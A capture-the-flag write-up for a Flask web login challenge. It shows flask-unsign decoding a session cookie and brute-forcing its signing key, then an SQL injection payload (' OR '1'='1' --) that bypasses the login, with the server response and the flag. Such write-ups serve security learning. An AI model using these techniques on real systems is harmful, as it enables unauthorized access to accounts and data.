<h2>Challenge description:</h2>

```

```

<h2>Solve:</h2>
<details>
    <summary>The dead cookie end</summary>
Looked at alot of different possible exploits. Started off with looking at the webserver "python-werkzeug" which was version 2.0.2 (quite old) and is supposed to only be used in a dev envireoment. Found some exploits related to debug mode and the "/console" path, but that was not enabled.

The app has a form that is posted to "/login". In the response you are redirected to "/" and told to set a cookie.

I started looking at the Set-Cookie response from the webserver since it seemed that there was some logic related to it. ("login failed" appeard when you presented the cookie)

![The Set-Cookie response](image.png)

Turns out Flask has its own session handling system. You can read the session variables by using flask-unsign:
```
(python) h@flakse:~/git/SiktCTF-2024/Web/squire/python$ flask-unsign -d -c eyJfZmxhc2hlcyI6W3siIHQiOlsiZXJyb3IiLCJMb2dpbiBmYWlsZWQhIl19XX0.ZwrjKA.AGDduQlwNvuV6B8RXOKaXFnQKXY
{'_flashes': [('error', 'Login failed!')]}
(python) h@flakse:~/git/SiktCTF-2024/Web/squire/python$ 
```
I stumbled upon [this](https://ldvargas.medium.com/hackpackctf-cookie-forge-3d922862d383) site when googling for more information. In that writeup they brute-force the key used for signing the cookie. After recovering the key they can sign their own, evil, cookie and the server will accept it.

I decided to try bruteforcing myself:
```
(python) h@flakse:~/git/SiktCTF-2024/Web/squire/python$ flask-unsign -u -c eyJfZmxhc2hlcyI6W3siIHQiOlsiZXJyb3IiLCJMb2dpbiBmYWlsZWQhIl19XX0.ZwrjKA.AGDduQlwNvuV6B8RXOKaXFnQKXY
[*] Session decodes to: {'_flashes': [('error', 'Login failed!')]}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2176): -----BEGIN PRIVATE KEY-----ECR
[+] Found secret key after 21760 attemptsastHlWgH4UWQ
'supersecretkey'
(python) h@flakse:~/git/SiktCTF-2024/Web/squire/python$ 
```

We got the secret!! "supersecretkey" 🥳

Now we just need to figure out what a successful login cookie looks like.

<h3>Or so i thought...</h3>
</details>


Turns out this was a dead end. After many hours i trying random fields in the cookie i started to look elsewhere. By unlocking a hint i knew i needed to look for SQL injections on the site

![SQL injection](image-1.png)'

After som trial and error i noticed that i would get a 500 response code if i had "admin" as username and " ' " as password. Changing out admin for another name did not result in a 500, so i was on to something.

I ended up trying a lot of different SQL Injection examples and eventually found this one:
``` 
username=admin&password=' OR '1'='1' --
```

Suddenly the server responded with the following:
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 599
Vary: Cookie
Server: Werkzeug/2.0.2 Python/3.9.19
Date: Sun, 13 Oct 2024 13:08:22 GMT

<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Success</title>
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/static/styles.css">
  </head>
  <body>
    <div class="card">
      <h1>Yippie!</h1>
      <p>You have logged in successfully.</p>
      <img src="/static/success.gif" alt="Success GIF">
      <br>
      <a href="/logout">Logout</a>
    </div>
  </body>
</html>
``` 

Loading the refrenced "/static/success.gif" gave me a gif with the flag!

![Flag GIF](success.gif)


<h2>Flag:</h2>

```
SiktCTF{YouDidItMiLord}
```